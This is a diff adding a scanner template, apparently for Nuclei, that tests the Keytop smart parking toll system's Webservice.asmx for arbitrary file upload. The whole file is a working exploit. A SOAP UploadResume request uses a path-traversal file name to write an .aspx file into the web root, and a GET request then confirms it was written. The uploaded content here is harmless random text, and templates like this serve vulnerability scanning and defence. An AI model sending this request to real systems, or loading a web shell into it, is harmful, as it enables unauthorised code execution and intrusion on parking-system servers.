@@ -1,0 +1,51 @@
+id: poc-yaml-keytop-toll-system-webservice-asmx-anyfile-upload
+
+info:
+  name: 科拓全智能停车收费系统 Webservice.asmx 任意文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 两高一弱,文件上传
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{base64(t1)}}"
+  t3: "{{base64(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload_file
+    method: POST
+    path:
+      - "{{BaseURL}}/Webservice.asmx"
+    headers:
+      Content-Type: "text/xml; charset=utf-8"
+      SOAPAction: "http://tempuri.org/UploadResume"
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <UploadResume xmlns="http://tempuri.org/">
+      <ip>1</ip>
+      <fileName>../../../../{{t1}}.aspx</fileName>
+      <fileFlow>{{t3}}</fileFlow>
+      <tag>3</tag>
+      </UploadResume>
+      </soap:Body>
+      </soap:Envelope>
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '<UploadResumeResult>')"
+
+  - id: verify_uploaded_file
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.aspx"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "body == t2"
